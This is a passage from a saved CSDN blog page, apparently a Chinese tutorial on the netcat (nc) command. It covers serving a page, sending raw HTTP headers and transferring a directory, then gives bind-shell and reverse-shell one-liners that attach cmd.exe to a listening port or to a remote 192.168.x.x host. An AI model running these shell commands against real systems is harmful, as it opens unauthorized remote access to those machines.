+<p><span style="font-family:Calibri; font-size:14px"># while true; do nc -l -p 80 -q 1 &lt; somepage.html; done</span></p>
+<p><span style="font-family:Calibri; font-size:14px">&nbsp;</span></p>
+<p><span style="font-family:Calibri; font-size:14px">11. </span>模拟<span style="font-family:Calibri">HTTP Headers,</span>获取网页源代码和返回头部信息</p>
+<p><span style="font-family:Calibri; font-size:14px">&nbsp;</span></p>
+<p><span style="font-family:Calibri; font-size:14px">[root@hatest1 ~]# nc 80</span></p>
+<p><span style="font-family:Calibri; font-size:14px">GET / HTTP/1.1</span></p>
+<p><span style="font-family:Calibri; font-size:14px">Host: ispconfig.org</span></p>
+<p><span style="font-family:Calibri; font-size:14px">Referrer: mypage.com</span></p>
+<p><span style="font-family:Calibri; font-size:14px">User-Agent: my-browser</span></p>
+<p><span style="font-family:Calibri; font-size:14px">&nbsp;</span></p>
+<p><span style="font-family:Calibri; font-size:14px">HTTP/1.1 200 OK</span></p>
+<p><span style="font-family:Calibri; font-size:14px">Date: Tue, 16 Dec 2008 07:23:24 GMT</span></p>
+<p><span style="font-family:Calibri; font-size:14px">Server: Apache/2.2.6 (Unix) DAV/2 mod_mono/1.2.1 mod_python/3.2.8 Python/2.4.3 mod_perl/2.0.2 Perl/v5.8.8</span></p>
+<p><span style="font-family:Calibri; font-size:14px">Set-Cookie: PHPSESSID=bbadorbvie1gn037iih6lrdg50; path=/</span></p>
+<p><span style="font-family:Calibri; font-size:14px">Expires: 0</span></p>
+<p><span style="font-family:Calibri; font-size:14px">Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0</span></p>
+<p><span style="font-family:Calibri; font-size:14px">Pragma: no-cache</span></p>
+<p><span style="font-family:Calibri; font-size:14px">Cache-Control: private, post-check=0, pre-check=0, max-age=0</span></p>
+<p><span style="font-family:Calibri; font-size:14px">Set-Cookie: oWn_sid=xRutAY; expires=Tue, 23-Dec-2008 07:23:24 GMT; path=/</span></p>
+<p><span style="font-family:Calibri; font-size:14px">Vary: Accept-Encoding</span></p>
+<p><span style="font-family:Calibri; font-size:14px">Transfer-Encoding: chunked</span></p>
+<p><span style="font-family:Calibri; font-size:14px">Content-Type: text/html</span></p>
+<p><span style="font-family:Calibri; font-size:14px">[......]</span></p>
+<p><span style="font-size:14px">在<span style="font-family:Calibri">nc</span>命令后，输入红色部分的内容，然后按两次回车，即可从对方获得<span style="font-family:Calibri">HTTP Headers</span>内容。</span></p>
+<p><span style="font-family:Calibri; font-size:14px">&nbsp;</span></p>
+<p><span style="font-family:Calibri; font-size:14px">&nbsp;</span></p>
+<p><span style="font-family:Calibri; font-size:14px">12. </span>传输目录</p>
+<p><span style="font-size:14px">从<span style="font-family:Calibri">server1</span>拷贝<span style="font-family:Calibri">nginx-0.6.34</span>目录内容到<span style="font-family:Calibri">server2</span>上。需要先在<span style="font-family:Calibri">server2</span>上，用<span style="font-family:Calibri">nc</span>激活监听，<span style="font-family:Calibri">server2</span>上运行：</span></p>
+<p><span style="font-size:14px">引用</span></p>
+<p><span style="font-family:Calibri; font-size:14px">&nbsp;</span></p>
+<p><span style="font-family:Calibri; font-size:14px">[root@hatest2 tmp]# nc -l 1234 |tar xzvf -</span></p>
+<p><span style="font-family:Calibri; font-size:14px">server1</span>上运行：</p>
+<p><span style="font-size:14px">引用</span></p>
+<p><span style="font-family:Calibri; font-size:14px">&nbsp;</span></p>
+<p><span style="font-family:Calibri; font-size:14px">[root@hatest1 ~]# ll -d nginx-0.6.34</span></p>
+<p><span style="font-family:Calibri; font-size:14px">drwxr-xr-x 8 1000 1000 4096 12-23 17:25 nginx-0.6.34</span></p>
+<p><span style="font-family:Calibri; font-size:14px">[root@hatest1 ~]# tar czvf – nginx-0.6.34|nc 192.168.228.222 1234</span></p>
+<p><span style="font-family:Calibri; font-size:14px">&nbsp;</span></p>
+<p><span style="font-family:Calibri; font-size:14px">&nbsp;</span></p>
+<p><span style="font-family:Calibri; font-size:14px">13.REMOTE</span>主机绑定<span style="font-family:Calibri">SHELL</span></p>
+<p><span style="font-size:14px">例子：</span></p>
+<p><span style="font-family:Calibri; font-size:14px">&nbsp;</span></p>
+<p><span style="font-size:14px">格式：<span style="font-family:Calibri">nc -l -p 5354 -t -e c:\winnt\system32\cmd.exe</span></span></p>
+<p><span style="font-size:14px">讲解：绑定<span style="font-family:Calibri">REMOTE</span>主机的<span style="font-family:Calibri">CMDSHELL</span>在<span style="font-family:Calibri">REMOTE</span>主机的<span style="font-family:Calibri">TCP5354</span>端口</span></p>
+<p><span style="font-family:Calibri; font-size:14px">&nbsp;</span></p>
+<p><span style="font-family:Calibri; font-size:14px">&nbsp;</span></p>
+<p><span style="font-family:Calibri; font-size:14px">14.REMOTE</span>主机绑定<span style="font-family:Calibri">SHELL</span>并反向连接</p>
+<p><span style="font-size:14px">例子：</span></p>
+<p><span style="font-family:Calibri; font-size:14px">&nbsp;</span></p>
+<p><span style="font-size:14px">格式：<span style="font-family:Calibri">nc -t -e c:\winnt\system32\cmd.exe 192.168.x.x 5354</span></span></p>
+<p><span style="font-size:14px">讲解：绑定<span style="font-family:Calibri">REMOTE</span>主机的<span style="font-family:Calibri">CMDSHELL</span>并反向连接到<span style="font-family:Calibri">192.168.x.x</span>的<span style="font-family:Calibri">TCP5354</span>端口</span></p>
+<p><span style="font-size:14px">以上为最基本的几种用法（其实<span style="font-family:Calibri">NC</span>的用法还有很多，</span></p>
+<p><span style="font-size:14px">当配合管道命令<span style="font-family:Calibri">"|"</span>与重定向命令<span style="font-family:Calibri">"&lt;"</span>、<span style="font-family:Calibri">"&gt;"</span>等等命令功能更强大<span style="font-family:Calibri">......</span>）。</span></p>
+<p><span style="font-family:Calibri; font-size:14px">&nbsp;&nbsp; </span></p>
+
+</div>
+
+
+
+
+<!-- Baidu Button BEGIN -->
+
+<div class="bdsharebuttonbox bdshare-button-style0-16" style="float: right;" data-bd-bind="1421048854457">
+<a href="http://blog.csdn.net/xifeijian/article/details/9348277#" class="bds_more" data-cmd="more" style="background-position:0 0 !important; background-image: url(http://bdimg.share.baidu.com/static/api/img/share/icons_0_16.png?v=d754dcc0.png) !important"></a>
+<a href="http://blog.csdn.net/xifeijian/article/details/9348277#" class="bds_qzone" data-cmd="qzone" title="分享到QQ空间" style="background-position:0 -52px !important"></a>
+<a href="http://blog.csdn.net/xifeijian/article/details/9348277#" class="bds_tsina" data-cmd="tsina" title="分享到新浪微博" style="background-position:0 -104px !important"></a>
+<a href="http://blog.csdn.net/xifeijian/article/details/9348277#" class="bds_tqq" data-cmd="tqq" title="分享到腾讯微博" style="background-position:0 -260px !important"></a>
+<a href="http://blog.csdn.net/xifeijian/article/details/9348277#" class="bds_renren" data-cmd="renren" title="分享到人人网" style="background-position:0 -208px !important"></a>
+<a href="http://blog.csdn.net/xifeijian/article/details/9348277#" class="bds_weixin" data-cmd="weixin" title="分享到微信" style="background-position:0 -1612px !important"></a>
+</div>
+<script>window._bd_share_config = { "common": { "bdSnsKey": {}, "bdText": "", "bdMini": "1", "bdMiniList": false, "bdPic": "", "bdStyle": "0", "bdSize": "16" }, "share": {} }; with (document) 0[(getElementsByTagName('head')[0] || body).appendChild(createElement('script')).src = 'http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion=' + ~(-new Date() / 36e5)];</script>
+<!-- Baidu Button END -->
+
+<!--192.168.100.33-->
+<ul class="article_next_prev">
+            <li class="prev_article"><span onclick="_gaq.push([&#39;_trackEvent&#39;,&#39;function&#39;, &#39;onclick&#39;, &#39;blog_articles_shangyipian&#39;]);location.href=&#39;/xifeijian/article/details/9364497&#39;;">上一篇</span><a href="http://blog.csdn.net/xifeijian/article/details/9364497" onclick="_gaq.push([&#39;_trackEvent&#39;,&#39;function&#39;, &#39;onclick&#39;, &#39;blog_articles_shangyipian&#39;])">Linux Shell脚本编程－－scp命令详解</a></li>
+            <li class="next_article"><span onclick="_gaq.push([&#39;_trackEvent&#39;,&#39;function&#39;, &#39;onclick&#39;, &#39;blog_articles_xiayipian&#39;]);location.href=&#39;/xifeijian/article/details/9367339&#39;;">下一篇</span><a href="http://blog.csdn.net/xifeijian/article/details/9367339" onclick="_gaq.push([&#39;_trackEvent&#39;,&#39;function&#39;, &#39;onclick&#39;, &#39;blog_articles_xiayipian&#39;])">Linux Shell脚本编程－－curl命令详解</a></li>
+</ul>
+
+<!-- Baidu Button BEGIN -->
+<script type="text/javascript" id="bdshare_js" data="type=tools&amp;uid=1536434" src="./Linux Shell脚本编程－－nc命令使用详解 - 上善若水，水善利万物而不争。 - 博客频道 - CSDN.NET_files/bds_s_v2.js"></script>
+
+<script type="text/javascript">
+    document.getElementById("bdshell_js").src = "http://bdimg.share.baidu.com/static/js/shell_v2.js?cdnversion=" + Math.ceil(new Date()/3600000)
+</script>
+<!-- Baidu Button END -->
+
+
+        <div id="digg" articleid="9348277">
+            <dl id="btnDigg" class="digg digg_disable">
+                <dt onclick="_gaq.push([&#39;_trackEvent&#39;,&#39;function&#39;, &#39;onclick&#39;, &#39;blog_articles_ding&#39;])">顶</dt>
+                <dd>0</dd>
+            </dl>
+            <dl id="btnBury" class="digg digg_disable">
+                <dt onclick="_gaq.push([&#39;_trackEvent&#39;,&#39;function&#39;, &#39;onclick&#39;, &#39;blog_articles_cai&#39;])">踩</dt>
+                <dd>0</dd>
+            </dl>
+        </div>
+</div>
+      <dl class="blog-associat-tag">
+        <dt>主题推荐</dt>
+        <dd>
+                <a href="http://www.csdn.net/tag/linux%20shell" target="_blank" class="blog-tage-red">linux shell</a> 
+                <a href="http://www.csdn.net/tag/%E7%BC%96%E7%A8%8B" target="_blank" class="blog-tage-red">编程</a> 
+                <a href="http://www.csdn.net/tag/%E8%84%9A%E6%9C%AC" target="_blank" class="blog-tage-red">脚本</a> 
+                <a href="http://www.csdn.net/tag/%E8%81%8A%E5%A4%A9%E5%B7%A5%E5%85%B7" target="_blank" class="blog-tage-red">聊天工具</a> 
+                <a href="http://www.csdn.net/tag/%E6%9C%8D%E5%8A%A1%E5%99%A8" target="_blank" class="blog-tage-red">服务器</a> 
+        </dd>
+    </dl> 
+
+
+<dl class="blog-ass-articl tracking-ad" data-mod="popu_36" id="res-relatived"> 
+     <dt><span>猜你在找</span></dt>    
+<dd style="background:url(http://static.blog.csdn.net/skin/default/images/blog-dot-red3.gif) no-repeat 0 10px;"><a href="http://blog.csdn.net/wirelessqa/article/details/7974531" title="python文件操作" strategy="CFRecommendAlgorithm" target="_blank">python文件操作</a></dd><dd style="background:url(http://static.blog.csdn.net/skin/default/images/blog-dot-red3.gif) no-repeat 0 10px;"><a href="http://blog.csdn.net/CHEN_JP/article/details/8922582" title="Shell中字符串分割的三种方法" strategy="CFRecommendAlgorithm" target="_blank">Shell中字符串分割的三种方法</a></dd><dd style="background:url(http://static.blog.csdn.net/skin/default/images/blog-dot-red3.gif) no-repeat 0 10px;"><a href="http://blog.csdn.net/hikaliv/article/details/12884481" title="尾递归CPS等几种求阶乘的算法" strategy="CFRecommendAlgorithm" target="_blank">尾递归CPS等几种求阶乘的算法</a></dd><dd style="background:url(http://static.blog.csdn.net/skin/default/images/blog-dot-red3.gif) no-repeat 0 10px;"><a href="http://blog.csdn.net/limin355/article/details/2007544" title="#2002 - 服务器没有响应 or the local MySQL servers socket is not correctly configured" strategy="CFRecommendAlgorithm" target="_blank">#2002 - 服务器没有响应 or the local MySQL servers socket is not correctly configured</a></dd><dd style="background:url(http://static.blog.csdn.net/skin/default/images/blog-dot-red3.gif) no-repeat 0 10px;"><a href="http://blog.csdn.net/wang794686714/article/details/39324687" title="ubuntu1404 安装sublime 并使用搜狗输入法" strategy="CFRecommendAlgorithm" target="_blank">ubuntu1404 安装sublime 并使用搜狗输入法</a></dd><dd style="background:url(http://static.blog.csdn.net/skin/default/images/blog-dot-red3.gif) no-repeat 0 10px;"><a href="http://blog.csdn.net/fei1700/article/details/4961653" title="gst-ffmpeg" strategy="CFRecommendAlgorithm" target="_blank">gst-ffmpeg</a></dd><dd style="background:url(http://static.blog.csdn.net/skin/default/images/blog-dot-red3.gif) no-repeat 0 10px;"><a href="http://blog.csdn.net/gooogleman/article/details/4430858" title="了解MmMapIoSpace以及MmUnmapIoSpace函数的实现原理以及实现方法 " strategy="CFRecommendAlgorithm" target="_blank">了解MmMapIoSpace以及MmUnmapIoSpace函数的实现原理以及实现方法 </a></dd><dd style="background:url(http://static.blog.csdn.net/skin/default/images/blog-dot-red3.gif) no-repeat 0 10px;"><a href="http://blog.csdn.net/yc0188/article/details/4155168" title="GZIP文件格式简介" strategy="CFRecommendAlgorithm" target="_blank">GZIP文件格式简介</a></dd><dd style="background:url(http://static.blog.csdn.net/skin/default/images/blog-dot-red3.gif) no-repeat 0 10px;"><a href="http://blog.csdn.net/langxiao24/article/details/5426217" title="Windows下JAVA开发环境的配置应用Eclipse" strategy="CFRecommendAlgorithm" target="_blank">Windows下JAVA开发环境的配置应用Eclipse</a></dd><dd style="background:url(http://static.blog.csdn.net/skin/default/images/blog-dot-red3.gif) no-repeat 0 10px;"><a href="http://blog.csdn.net/a252228180/article/details/9138281" title="c++ 阳历转阴历转" strategy="CFRecommendAlgorithm" target="_blank">c++ 阳历转阴历转</a></dd></dl>
+
+<script type="text/javascript">
+    var searchtitletags = 'Linux Shell脚本编程－－nc命令使用详解' + ',' + 'linux shell,编程,脚本,聊天工具,服务器';
+    searchService({
+        index: 'blog',
+        query: searchtitletags,
+        from: 10,
+        size: 10,
+        appendTo: '#res-relatived',
+        url: 'recommend',
+        his: 2,
+        client: "blog_cf_enhance",
+        tmpl: '<dd style="background:url(http://static.blog.csdn.net/skin/default/images/blog-dot-red3.gif) no-repeat 0 10px;"><a href="#{ url }" title="#{ title }" strategy="#{ strategy }">#{ title }</a></dd>'
+    });
+
+ </script>   
+
+
+    <div id="ad_cen">
+   
+          <script type="text/javascript">
+              new Ad(4, 'ad_cen');
+          </script>
+    </div>
+<div class="comment_class">
+    <div id="comment_title" class="panel_head">
+        <span class="see_comment">查看评论</span><a name="comments"></a></div>
+    <div id="comment_list"><br>&nbsp;&nbsp;暂无评论<br><br><div class="clear"></div></div>
+    <div id="comment_bar">
+    </div>
+    <div id="comment_form"><div class="guest_link">您还没有登录,请<a href="javascript:void(0);" onclick="javascript:loginbox();">[登录]</a>或<a href="http://passport.csdn.net/account/register?from=http%3A%2F%2Fblog.csdn.net%2Fxifeijian%2Farticle%2Fdetails%2F9348277">[注册]</a></div></div>
+
+    <div class="announce">
+        * 以上用户言论只代表其个人观点，不代表CSDN网站的观点或立场<a name="reply"></a><a name="quote"></a></div>
+</div>
+
+<script type="text/javascript">
+    var fileName = '9348277';
+    var commentscount = 0;
+    var islock = false
+</script>
+<script type="text/javascript" src="./Linux Shell脚本编程－－nc命令使用详解 - 上善若水，水善利万物而不争。 - 博客频道 - CSDN.NET_files/comment.js"></script>
+    <div id="ad_bot">
+    </div>
+    <script type="text/javascript">
+    new Ad(5, 'ad_bot');
+    </script>
+<div id="report_dialog">
+</div>
+
+<div id="d-top" style="bottom:60px;">
+        <a id="quick-reply" class="btn btn-top q-reply" title="快速回复" style="display:none;">
+            <img src="./Linux Shell脚本编程－－nc命令使用详解 - 上善若水，水善利万物而不争。 - 博客频道 - CSDN.NET_files/blog-icon-reply.png" alt="快速回复">
+        </a>    
+
+    <a id="d-top-a" class="btn btn-top backtop" style="display: none;" title="返回顶部" onclick="_gaq.push([&#39;_trackEvent&#39;,&#39;function&#39;, &#39;onclick&#39;, &#39;blog_articles_huidaodingbu&#39;])">         
+         <img src="./Linux Shell脚本编程－－nc命令使用详解 - 上善若水，水善利万物而不争。 - 博客频道 - CSDN.NET_files/top.png" alt="TOP">
+    </a>
+</div>
+<script type="text/javascript">
+    $(function ()
+    {
+        $("#ad_frm_0").height("90px");
+        
+        setTimeout(function(){
+            $("#ad_frm_2").height("200px");
+        },1000);
+        
+        /*
+        if($("#comment_content").length>0)
+        {
+            $("#quick-reply").show();
+
+            $("#quick-reply").click(function(){
+                setEditorFocus();
+            });
+        }       
+     
+        var d_top = $('#d-top-a');
+
+        document.onscroll = function ()
+        {
+            var scrTop = (document.body.scrollTop || document.documentElement.scrollTop);
+            if (scrTop > 500)
+            {
+                d_top.show();
+            } else
+            {
+                d_top.hide();
+            }
+        }
+        $('#d-top-a').click(function ()
+        {
+            scrollTo(0, 0);
+            this.blur();
+            return false;
+        });
+        */
+    });
+  
+</script>
+<style type="text/css">
+    .tag_list
+    {
+        background: none repeat scroll 0 0 #FFFFFF;
+        border: 1px solid #D7CBC1;
+        color: #000000;
+        font-size: 12px;
+        line-height: 20px;
+        list-style: none outside none;
+        margin: 10px 2% 0 1%;
+        padding: 1px;
+    }
+    .tag_list h5
+    {
+        background: none repeat scroll 0 0 #E0DBD3;
+        color: #47381C;
+        font-size: 12px;
+        height: 24px;
+        line-height: 24px;
+        padding: 0 5px;
+        margin: 0;
+    }
+    .tag_list h5 a
+    {
+        color: #47381C;
+    }
+    .classify
+    {
+        margin: 10px 0;
+        padding: 4px 12px 8px;
+    }
+    .classify a
+    {
+        margin-right: 20px;
+        white-space: nowrap;
+    }
+</style>
+<div class="tag_list">
+    <h5>
+        <a href="http://www.csdn.net/tag/" target="_blank">核心技术类目</a></h5>
+    <div class="classify">
+<a title="全部主题" href="http://www.csdn.net/tag" target="_blank" onclick="LogClickCount(this,336);">全部主题</a>
+<a title="Hadoop" href="http://g.csdn.net/5272865" target="_blank" onclick="LogClickCount(this,336);">Hadoop</a>
+<a title="AWS" href="http://g.csdn.net/5272866" target="_blank" onclick="LogClickCount(this,336);">AWS</a>
+<a title="移动游戏" href="http://g.csdn.net/5272870" target="_blank" onclick="LogClickCount(this,336);">移动游戏</a>
+<a title="Java" href="http://g.csdn.net/5272871" target="_blank" onclick="LogClickCount(this,336);">Java</a>
+<a title="Android" href="http://g.csdn.net/5272872" target="_blank" onclick="LogClickCount(this,336);">Android</a>
+<a title="iOS" href="http://g.csdn.net/5272873" target="_blank" onclick="LogClickCount(this,336);">iOS</a>
+<a title="Swift" href="http://g.csdn.net/5272868" target="_blank" onclick="LogClickCount(this,336);">Swift</a>
+<a title="智能硬件" href="http://g.csdn.net/5272869" target="_blank" onclick="LogClickCount(this,336);">智能硬件</a>
+<a title="Docker" href="http://g.csdn.net/5272867" target="_blank" onclick="LogClickCount(this,336);">Docker</a>
+<a title="OpenStack" href="http://g.csdn.net/5272925" target="_blank" onclick="LogClickCount(this,336);">OpenStack</a>
+<a title="VPN" href="http://www.csdn.net/tag/vpn" target="_blank" onclick="LogClickCount(this,336);">VPN</a>
+<a title="Spark" href="http://g.csdn.net/5272924" target="_blank" onclick="LogClickCount(this,336);">Spark</a>
+<a title="ERP" href="http://www.csdn.net/tag/erp" target="_blank" onclick="LogClickCount(this,336);">ERP</a>
+<a title="IE10" href="http://www.csdn.net/tag/ie10" target="_blank" onclick="LogClickCount(this,336);">IE10</a>
+<a title="Eclipse" href="http://www.csdn.net/tag/eclipse" target="_blank" onclick="LogClickCount(this,336);">Eclipse</a>
+<a title="CRM" href="http://www.csdn.net/tag/crm" target="_blank" onclick="LogClickCount(this,336);">CRM</a>
+<a title="JavaScript" href="http://www.csdn.net/tag/javascript" target="_blank" onclick="LogClickCount(this,336);">JavaScript</a>
+<a title="数据库" href="http://www.csdn.net/tag/%E6%95%B0%E6%8D%AE%E5%BA%93" target="_blank" onclick="LogClickCount(this,336);">数据库</a>
+<a title="Ubuntu" href="http://www.csdn.net/tag/ubuntu" target="_blank" onclick="LogClickCount(this,336);">Ubuntu</a>
+<a title="NFC" href="http://www.csdn.net/tag/nfc" target="_blank" onclick="LogClickCount(this,336);">NFC</a>
+<a title="WAP" href="http://www.csdn.net/tag/wap" target="_blank" onclick="LogClickCount(this,336);">WAP</a>
+<a title="jQuery" href="http://www.csdn.net/tag/jquery" target="_blank" onclick="LogClickCount(this,336);">jQuery</a>
+<a title="BI" href="http://www.csdn.net/tag/bi" target="_blank" onclick="LogClickCount(this,336);">BI</a>
+<a title="HTML5" href="http://www.csdn.net/tag/html5" target="_blank" onclick="LogClickCount(this,336);">HTML5</a>
+<a title="Spring" href="http://www.csdn.net/tag/spring" target="_blank" onclick="LogClickCount(this,336);">Spring</a>
+<a title="Apache" href="http://www.csdn.net/tag/apache" target="_blank" onclick="LogClickCount(this,336);">Apache</a>
+<a title=".NET" href="http://www.csdn.net/tag/.net" target="_blank" onclick="LogClickCount(this,336);">.NET</a>
+<a title="API" href="http://www.csdn.net/tag/api" target="_blank" onclick="LogClickCount(this,336);">API</a>
+<a title="HTML" href="http://www.csdn.net/tag/html" target="_blank" onclick="LogClickCount(this,336);">HTML</a>
+<a title="SDK" href="http://www.csdn.net/tag/sdk" target="_blank" onclick="LogClickCount(this,336);">SDK</a>
+<a title="IIS" href="http://www.csdn.net/tag/iis" target="_blank" onclick="LogClickCount(this,336);">IIS</a>
+<a title="Fedora" href="http://www.csdn.net/tag/fedora" target="_blank" onclick="LogClickCount(this,336);">Fedora</a>
+<a title="XML" href="http://www.csdn.net/tag/xml" target="_blank" onclick="LogClickCount(this,336);">XML</a>
+<a title="LBS" href="http://www.csdn.net/tag/lbs" target="_blank" onclick="LogClickCount(this,336);">LBS</a>
+<a title="Unity" href="http://www.csdn.net/tag/unity" target="_blank" onclick="LogClickCount(this,336);">Unity</a>
+<a title="Splashtop" href="http://www.csdn.net/tag/splashtop" target="_blank" onclick="LogClickCount(this,336);">Splashtop</a>
+<a title="UML" href="http://www.csdn.net/tag/uml" target="_blank" onclick="LogClickCount(this,336);">UML</a>
+<a title="components" href="http://www.csdn.net/tag/components" target="_blank" onclick="LogClickCount(this,336);">components</a>
+<a title="Windows Mobile" href="http://www.csdn.net/tag/windowsmobile" target="_blank" onclick="LogClickCount(this,336);">Windows Mobile</a>
+<a title="Rails" href="http://www.csdn.net/tag/rails" target="_blank" onclick="LogClickCount(this,336);">Rails</a>
+<a title="QEMU" href="http://www.csdn.net/tag/qemu" target="_blank" onclick="LogClickCount(this,336);">QEMU</a>
+<a title="KDE" href="http://www.csdn.net/tag/kde" target="_blank" onclick="LogClickCount(this,336);">KDE</a>
+<a title="Cassandra" href="http://www.csdn.net/tag/cassandra" target="_blank" onclick="LogClickCount(this,336);">Cassandra</a>
+<a title="CloudStack" href="http://www.csdn.net/tag/cloudstack" target="_blank" onclick="LogClickCount(this,336);">CloudStack</a>
+<a title="FTC" href="http://www.csdn.net/tag/ftc" target="_blank" onclick="LogClickCount(this,336);">FTC</a>
+<a title="coremail" href="http://www.csdn.net/tag/coremail" target="_blank" onclick="LogClickCount(this,336);">coremail</a>
+<a title="OPhone " href="http://www.csdn.net/tag/ophone" target="_blank" onclick="LogClickCount(this,336);">OPhone </a>
+<a title="CouchBase" href="http://www.csdn.net/tag/couchbase" target="_blank" onclick="LogClickCount(this,336);">CouchBase</a>
+<a title="云计算" href="http://www.csdn.net/tag/%E4%BA%91%E8%AE%A1%E7%AE%97" target="_blank" onclick="LogClickCount(this,336);">云计算</a>
+<a title="iOS6" href="http://www.csdn.net/tag/iOS6" target="_blank" onclick="LogClickCount(this,336);">iOS6</a>
+<a title="Rackspace " href="http://www.csdn.net/tag/rackspace" target="_blank" onclick="LogClickCount(this,336);">Rackspace </a>
+<a title="Web App" href="http://www.csdn.net/tag/webapp" target="_blank" onclick="LogClickCount(this,336);">Web App</a>
+<a title="SpringSide" href="http://www.csdn.net/tag/springside" target="_blank" onclick="LogClickCount(this,336);">SpringSide</a>
+<a title="Maemo" href="http://www.csdn.net/tag/maemo" target="_blank" onclick="LogClickCount(this,336);">Maemo</a>
+<a title="Compuware" href="http://www.csdn.net/tag/compuware" target="_blank" onclick="LogClickCount(this,336);">Compuware</a>
+<a title="大数据" href="http://www.csdn.net/tag/%E5%A4%A7%E6%95%B0%E6%8D%AE" target="_blank" onclick="LogClickCount(this,336);">大数据</a>
+<a title="aptech" href="http://www.csdn.net/tag/aptech" target="_blank" onclick="LogClickCount(this,336);">aptech</a>
+<a title="Perl" href="http://www.csdn.net/tag/perl" target="_blank" onclick="LogClickCount(this,336);">Perl</a>
+<a title="Tornado" href="http://www.csdn.net/tag/tornado" target="_blank" onclick="LogClickCount(this,336);">Tornado</a>
+<a title="Ruby" href="http://www.csdn.net/tag/ruby" target="_blank" onclick="LogClickCount(this,336);">Ruby</a>
+<a title="Hibernate" href="http://www.csdn.net/hibernate" target="_blank" onclick="LogClickCount(this,336);">Hibernate</a>
+<a title="ThinkPHP" href="http://www.csdn.net/tag/thinkphp" target="_blank" onclick="LogClickCount(this,336);">ThinkPHP</a>
+<a title="HBase" href="http://www.csdn.net/tag/hbase" target="_blank" onclick="LogClickCount(this,336);">HBase</a>
+<a title="Pure" href="http://www.csdn.net/tag/pure" target="_blank" onclick="LogClickCount(this,336);">Pure</a>
+<a title="Solr" href="http://www.csdn.net/tag/solr" target="_blank" onclick="LogClickCount(this,336);">Solr</a>
+<a title="Angular" href="http://www.csdn.net/tag/angular" target="_blank" onclick="LogClickCount(this,336);">Angular</a>
+<a title="Cloud Foundry" href="http://www.csdn.net/tag/cloudfoundry" target="_blank" onclick="LogClickCount(this,336);">Cloud Foundry</a>
+<a title="Redis" href="http://www.csdn.net/tag/redis" target="_blank" onclick="LogClickCount(this,336);">Redis</a>
+<a title="Scala" href="http://www.csdn.net/tag/scala" target="_blank" onclick="LogClickCount(this,336);">Scala</a>
+<a title="Django" href="http://www.csdn.net/tag/django" target="_blank" onclick="LogClickCount(this,336);">Django</a>
+<a title="Bootstrap" href="http://www.csdn.net/tag/bootstrap" target="_blank" onclick="LogClickCount(this,336);">Bootstrap</a>
+    </div>
+</div>
+
+<div id="pop_win" style="display:none ;position: absolute; z-index: 10000; border: 1px solid rgb(220, 220, 220); top: 222.5px; left: 630px; opacity: 1; background: none 0px 0px repeat scroll rgb(255, 255, 255);">
+    
+</div>
+<div id="popup_mask"></div>
+<style>
+    #popup_mask
+    {
+        position: absolute;
+        width: 100%;
+        height: 100%;
+        background: #000;
+        z-index: 9999;
+        left: 0px;
+        top: 0px;
+        opacity: 0.3;
+        filter: alpha(opacity=30);
+        display: none;
+    }
+
+</style>
+
+
+
+
+<script type="text/javascript">
+    $(function(){
+        setTimeout(function(){
+            $(".comment_body:contains('回复')").each(function(index,item){
+                var u=$(this).text().split('：')[0].toString().replace("回复","")
+                var thisComment=$(this);
+                if(u)
+                {
+                    $.getJSON("https://passport.csdn.net/get/nick?callback=?", {users: u}, function(a) {
+                        if(a!=null&&a.data!=null&&a.data.length>0)
+                        {
+                            nick=a.data[0].n; 
+                            if(u!=nick)
+                            {
+                                thisComment.text(thisComment.text().replace(u,nick));  
+                            }
+                        }       
+                    });  
+                }
+            });
+        },200);  
+        
+        setTimeout(function(){
+            $("a img[src='http://js.tongji.linezing.com/stats.gif']").parent().css({"position":"absolute","left":"50%"});
+        },300);
+    });
+
+    function loginbox(){
+        var $logpop=$("#pop_win");
+        $logpop.html('<iframe src="https://passport.csdn.net/account/loginbox?service=http://static.blog.csdn.net/callback.htm" frameborder="0" height="600" width="400" scrolling="no"></iframe>');
+
+        $('#popup_mask').css({
+            opacity: 0.5,
+            width: $( document ).width() + 'px',
+            height:  $( document ).height() + 'px'
+        });
+        $('#popup_mask').css("display","block");
+ 
+        $logpop.css( {
+            top: ($( window ).height() - $logpop.height())/ 2  + $( window 
+       ).scrollTop() + 'px',
+            left:($( window ).width() - $logpop.width())/ 2
+        } );
+ 
+        setTimeout( function () {
+            $logpop.show();
+            $logpop.css( {
+                opacity: 1
+            } );
+        }, 200 );
+ 
+        $('#popup_mask').unbind("click");
+        $('#popup_mask').bind("click", function(){
+            $('#popup_mask').hide();
+            var $clopop = $("#pop_win");
+            $("#common_ask_div_sc").css("display","none");
+            $clopop.css( {
+                opacity: 0
+            } );
+            setTimeout( function () {
+                $clopop.hide();
+            }, 350 );
+            return false;
+        });
+    }    
+
+</script>
+                        <div class="clear">
+                        </div>
+                    </div>                   
+                
+            </div>
+            <div id="side">
+    <div class="side">
+<div id="panel_Profile" class="panel">
+<ul class="panel_head"><span>个人资料</span></ul>
+<ul class="panel_body profile">
+<div id="blog_userface">
+    <a href="http://my.csdn.net/xifeijian" target="_blank">
+    <img src="./Linux Shell脚本编程－－nc命令使用详解 - 上善若水，水善利万物而不争。 - 博客频道 - CSDN.NET_files/1_xifeijian.jpg" title="访问我的空间" style="max-width:90%">
+    </a>
+    <br>
+    <span><a href="http://my.csdn.net/xifeijian" class="user_name" target="_blank">xifeijian</a></span>
+</div>
+<div class="interact">
+<a href="javascript:void(0);" class="attent" id="span_add_follow" title="[加关注]" onclick="_gaq.push([&#39;_trackEvent&#39;,&#39;function&#39;, &#39;onclick&#39;, &#39;blog_articles_guanzhu&#39;])"></a>
+
+ <a href="javascript:void(0);" class="letter" title="[发私信]" onclick="window.open(&#39;http://msg.csdn.net/letters/model?receiver=xifeijian&#39;,&#39;_blank&#39;,&#39;height=350,width=700&#39;);_gaq.push([&#39;_trackEvent&#39;,&#39;function&#39;, &#39;onclick&#39;, &#39;blog_articles_sixin&#39;])"></a>  
+</div>
+<div id="blog_medal">
+                       <div class="ico_expert" title="CSDN认证专家" style="width:54px;height:60px;background:url(&#39;http://csdnimg.cn/jifen/images/xunzhang/xunzhang/bokezhuanjiamiddle.png&#39;) no-repeat"></div>
+                <div id="bms_box">
+                                            <a target="_blank">
+                                                    <img src="./Linux Shell脚本编程－－nc命令使用详解 - 上善若水，水善利万物而不争。 - 博客频道 - CSDN.NET_files/zhuanlandaren.png" onmouseover="m_over_m(this,2)" onmouseout="m_out_m()" alt="1">
+                                            </a>
+               </div>
+</div>
+<ul id="blog_rank">
+    <li>访问：<span>470759次</span></li>
